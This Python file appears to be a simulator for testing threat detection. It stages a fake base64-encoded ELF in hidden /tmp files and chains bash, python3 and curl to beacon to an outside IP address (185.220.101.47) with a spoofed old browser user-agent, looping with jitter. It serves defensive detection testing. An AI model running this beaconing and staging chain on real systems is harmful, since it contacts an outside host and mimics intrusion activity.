from __future__ import annotations

import base64
import os
import pathlib
import subprocess
import time
import random
import sys
sys.path.insert(0, str(pathlib.Path(__file__).parents[2]))
from spawner.utils import set_proc_name, log, jitter

# LOTL chain: bash → python3 → curl
# Classic living-off-the-land indicator: legitimate binaries chained in suspicious ways
PROC = "bash"
STAGE_FILE = pathlib.Path("/tmp/.lotl_stage")
LOG_FILE = pathlib.Path("/tmp/.lotl.log")


def write_stage_payload() -> None:
    # Fake ELF with base64 wrapper — simulates dropper staging
    fake_elf = b"\x7fELF\x02\x01\x01\x00" + os.urandom(508)
    encoded = base64.b64encode(fake_elf)
    STAGE_FILE.write_bytes(encoded)
    log(PROC, f"Stage payload written: {STAGE_FILE} ({len(encoded)} bytes)")


def spawn_stage2() -> None:
    # Stage 2: python3 reading the payload, spawning curl
    stage2_code = f"""
import base64, os, pathlib, subprocess, time, sys, socket

# Set process name to python3 (already is, but make cmdline look like a real file)
stage = pathlib.Path("/tmp/.lotl_stage")
if stage.exists():
    data = base64.b64decode(stage.read_bytes())

# Touch a marker file
marker = f"/tmp/.py_exec_marker_{{int(time.time())}}"
pathlib.Path(marker).write_bytes(b"executed")

# Spawn stage 3: curl with old IE user-agent (major IOC)
try:
    subprocess.Popen(
        ["curl", "-s", "--max-time", "5",
         "-A", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
         "-o", f"/tmp/.curl_resp_{{int(time.time())}}",
         "http://185.220.101.47/beacon"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=False,  # child of python3, grandchild of bash — full chain visible
    )
    with open("/tmp/.lotl.log", "a") as f:
        import datetime
        f.write(f"[{{datetime.datetime.now().isoformat()}}] stage3 curl spawned\\n")
except Exception as e:
    with open("/tmp/.lotl.log", "a") as f:
        import datetime
        f.write(f"[{{datetime.datetime.now().isoformat()}}] stage3 failed: {{e}}\\n")

time.sleep(15)
"""
    script_path = pathlib.Path("/tmp/.lotl_s2.py")
    script_path.write_text(stage2_code)

    try:
        subprocess.Popen(
            [sys.executable, str(script_path)],
            start_new_session=False,  # stay as child of "bash" — preserves process tree
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        log(PROC, "Stage 2 (python3) spawned")
    except Exception as e:
        log(PROC, f"Stage 2 spawn failed: {e}")


def enumerate_procs() -> None:
    try:
        for pid_dir in random.sample(list(pathlib.Path("/proc").iterdir()), 10):
            if pid_dir.name.isdigit():
                try:
                    (pid_dir / "cmdline").read_bytes()
                except Exception:
                    pass
    except Exception:
        pass


def main() -> None:
    set_proc_name(PROC)
    log(PROC, "LOTL loader started")
    write_stage_payload()

    while True:
        enumerate_procs()
        time.sleep(jitter(300.0))
        write_stage_payload()
        spawn_stage2()
        time.sleep(jitter(300.0))


main()
